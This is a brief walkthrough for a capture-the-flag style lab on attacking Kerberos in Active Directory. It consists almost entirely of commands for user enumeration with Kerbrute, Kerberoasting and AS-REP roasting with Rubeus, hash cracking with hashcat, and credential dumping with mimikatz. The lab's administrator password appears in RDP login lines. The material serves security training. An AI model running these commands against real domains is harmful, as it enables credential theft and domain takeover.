# [Attacking Kerberos](https://tryhackme.com/room/attackingkerberos)

Set the victim's machine ip:

```shell
export MACHINE_IP=x.x.x.x
```

## Task 2 Enumeration w/ Kerbrute

```shell
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
wget https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/User.txt

chmod +x kerbrute_linux_amd64
./kerbrute_linux_amd64 userenum --dc $MACHINE_IP -d CONTROLLER.local User.txt
```

## Task 3 Harvesting & Brute-Forcing Tickets w/ Rubeus

```shell
xfreerdp /u:Administrator /p:'P@$$W0rd' /v:$MACHINE_IP +clipboard
cd C:\Users\Administrator\Downloads
Rubeus.exe harvest /interval:30
```

## Task 4 Kerberoasting w/ Rubeus & Impacket

```shell
xfreerdp /u:Administrator /p:'P@$$W0rd' /v:$MACHINE_IP +clipboard
cd C:\Users\Administrator\Downloads
Rubeus.exe kerberoast

# Copy each hash in one line to hashes.txt

wget https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/Pass.txt
hashcat -m 13100 -a 0 hashes.txt Pass.txt
```

## Task 5 AS-REP Roasting w/ Rubeus

```shell
xfreerdp /u:Administrator /p:'P@$$W0rd' /v:$MACHINE_IP +clipboard
cd C:\Users\Administrator\Downloads
Rubeus.exe asreproast

# Copy each hash in one line to hashes.txt
# Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.....

wget https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/Pass.txt
hashcat -m 18200 -a 0 hashes.txt Pass.txt
```

## Task 7 Golden/Silver Ticket Attacks w/ mimikatz

```shell
xfreerdp /u:Administrator /p:'P@$$W0rd' /v:$MACHINE_IP +clipboard
mimikatz.exe
privilege::debug
lsadump::lsa /inject /name:SQLService
lsadump::lsa /inject /name:Administrator
```
